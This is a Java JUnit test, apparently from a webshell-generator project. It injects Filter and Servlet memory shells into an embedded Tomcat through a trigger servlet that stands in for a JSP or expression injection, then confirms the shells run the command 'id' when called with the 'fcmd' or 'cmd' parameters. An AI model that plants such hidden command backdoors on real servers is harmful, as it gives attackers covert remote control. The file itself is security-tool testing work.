package com.reajason.javaweb.examples.customgui.server;

import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.command.CommandConfig;
import com.reajason.javaweb.utils.ClassDefiner;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.startup.Tomcat;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 使用期验证：自定义 server 的注入器在真实容器里跑通。
 *
 * <p>应用内注入的场景：注入器由 webapp 里的一个入口（这里是一个 trigger servlet，
 * 对应真实场景的 JSP / EL / 表达式注入）执行 —— 注入器从 TCCL（webapp ClassLoader）
 * 反射找到 ServletContext，用公有 API 注册内存马，容器私有反射只有找 context 那十行。
 *
 * @author ReaJason
 */
class DemoServerEmbeddedTomcatTest {

    // Filter 内存马与 Servlet 内存马各用各的触发参数，避免 /* 上的 Filter 抢先应答
    private static final String FILTER_PARAM = "fcmd";
    private static final String SERVLET_PARAM = "cmd";

    private static final OkHttpClient CLIENT = new OkHttpClient();

    @TempDir
    Path baseDir;

    private Tomcat tomcat;

    @AfterEach
    void stopTomcat() throws Exception {
        if (tomcat != null) {
            tomcat.stop();
            tomcat.destroy();
        }
    }

    @Test
    void injectorRunsInsideTheAppAndRegistersWorkingShells() throws Exception {
        List<MemShellResult> shells = new ArrayList<>();
        shells.add(generate(ShellType.FILTER, FILTER_PARAM, "/*"));
        shells.add(generate(ShellType.SERVLET, SERVLET_PARAM, "/cmd"));

        Files.createDirectories(baseDir.resolve("webapp"));
        tomcat = new Tomcat();
        tomcat.setBaseDir(baseDir.resolve("tomcat").toString());
        tomcat.setPort(0);
        tomcat.getConnector();
        // addWebapp（而不是 addContext）：装上默认 servlet 映射，请求才会走到 filter chain
        StandardContext context = (StandardContext) tomcat.addWebapp("", baseDir.resolve("webapp").toString());

        // webapp 内的"入口"：真实场景里这是 JSP / EL / 表达式注入，这里用一个 trigger servlet 代替
        tomcat.addServlet(context, "trigger", new HttpServlet() {
            @Override
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
                StringBuilder report = new StringBuilder();
                for (MemShellResult shell : shells) {
                    try {
                        // 注入器在请求线程里执行：thread-local 里有请求门面，ServletContext 可被找到
                        Object injector = ClassDefiner.defineClass(shell.getInjectorBytes()).getDeclaredConstructor().newInstance();
                        report.append(injector).append('\n');
                    } catch (Exception e) {
                        report.append("injector failed: ").append(e);
                    }
                }
                resp.getWriter().write(report.toString());
            }
        });
        context.addServletMappingDecoded("/trigger", "trigger");

        tomcat.start();
        String url = "http://127.0.0.1:" + tomcat.getConnector().getLocalPort();

        // 触发注入，注入器自报结果
        HttpResult trigger = get(url, "/trigger");
        assertEquals(200, trigger.code);
        assertTrue(trigger.body.contains("filter [/*] ready"), trigger.body);
        assertTrue(trigger.body.contains("servlet [/cmd] ready"), trigger.body);

        // Filter 内存马：挂在 /* 上，只认 fcmd 参数
        HttpResult filterHit = get(url, "/test", Collections.singletonMap(FILTER_PARAM, "id"));
        assertEquals(200, filterHit.code);
        assertTrue(filterHit.body.contains("uid="), filterHit.body);

        // Servlet 内存马：只注册在 /cmd 上，只认 cmd 参数
        HttpResult servletHit = get(url, "/cmd", Collections.singletonMap(SERVLET_PARAM, "id"));
        assertEquals(200, servletHit.code);
        assertTrue(servletHit.body.contains("uid="), servletHit.body);

        // 不带触发参数：Filter 放行原业务（webapp 里没有 /test，所以 404）
        assertEquals(404, get(url, "/test").code);
    }

    private static MemShellResult generate(String shellType, String paramName, String urlPattern) {
        return new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(DemoServerProvider.NAME)
                        .shellTool(ShellTool.Command)
                        .shellType(shellType)
                        .build(),
                InjectorConfig.builder().urlPattern(urlPattern).build(),
                CommandConfig.builder().paramName(paramName).build());
    }

    private static HttpResult get(String url, String path) throws IOException {
        return get(url, path, Collections.emptyMap());
    }

    private static HttpResult get(String url, String path, Map<String, String> params) throws IOException {
        HttpUrl.Builder urlBuilder = Objects.requireNonNull(HttpUrl.parse(url + path)).newBuilder();
        for (Map.Entry<String, String> param : params.entrySet()) {
            urlBuilder.addQueryParameter(param.getKey(), param.getValue());
        }
        Request.Builder requestBuilder = new Request.Builder().url(urlBuilder.build());
        try (Response response = CLIENT.newCall(requestBuilder.build()).execute()) {
            HttpResult result = new HttpResult(response.code(), response.body().string());
            System.out.println("GET " + path + " " + params + " -> " + result.code + " " + result.body);
            return result;
        }
    }

    private static final class HttpResult {
        private final int code;
        private final String body;

        private HttpResult(int code, String body) {
            this.code = code;
            this.body = body;
        }
    }
}
